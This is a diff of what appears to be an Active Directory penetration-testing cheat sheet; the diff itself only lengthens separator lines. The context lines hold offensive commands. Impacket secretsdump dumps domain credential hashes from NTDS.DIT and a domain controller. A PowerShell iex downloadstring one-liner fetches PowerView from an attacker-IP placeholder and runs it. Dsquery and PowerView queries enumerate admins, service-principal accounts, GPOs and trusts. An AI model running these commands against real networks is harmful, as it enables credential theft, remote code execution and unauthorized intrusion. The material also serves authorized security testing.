@@ -74,7 +74,7 @@ auxiliary/admin/smb/psexec_ntdsgrab
 impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
 
 impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PowerView
 
@@ -83,7 +83,7 @@ cd to a discrete, writable directory (c:\users\<user>\appdata\local).
 iex (new-object net.webclient).downloadstring('http://<attacker IP>/PowerView.ps1')
 
 Invoke-ACLScanner | Export-PowerViewCSV acls.csv
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # ADACLScanner
 
@@ -98,7 +98,7 @@ iex (new-object net.webclient).downloadfile('http://<target IP>/ADACLScan.ps1', 
 .\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
 
 File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show Domain Controllers (DC)
 dsquery server
@@ -129,7 +129,7 @@ get-netcomputer -fulldata | select-object dnshostname,description,operatingsyste
 
 # Show servers based on description
 dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show all Active Directory (AD) user accounts
 dsquery user -limit 0
@@ -149,7 +149,7 @@ get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,n
 dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
 dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
 get-netuser -spn | select-object samaccountname,serviceprincipalname
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show administrators
 dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
@@ -176,7 +176,7 @@ net group “enterprise admins” /domain
 dsquery * -filter “name=administrators” -attr member -l
 get-netgroup -fulldata -groupname "administrators" | select-object member
 net localgroup administrators /domain
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show Organizational Units (OU)
 dsquery ou -limit 0
@@ -188,7 +188,7 @@ dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user
 
 # Show child OUs under parent OU
 dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
  
 # Show All Group Policy Objects (GPO) data
 dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
@@ -201,7 +201,7 @@ get-netgpo | select-object name,displayname
 # Show OUs and applied GPOs
 dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
 get-netou -fulldata | select-object distinguishedname, gplink
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show Trust Relationships
 dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
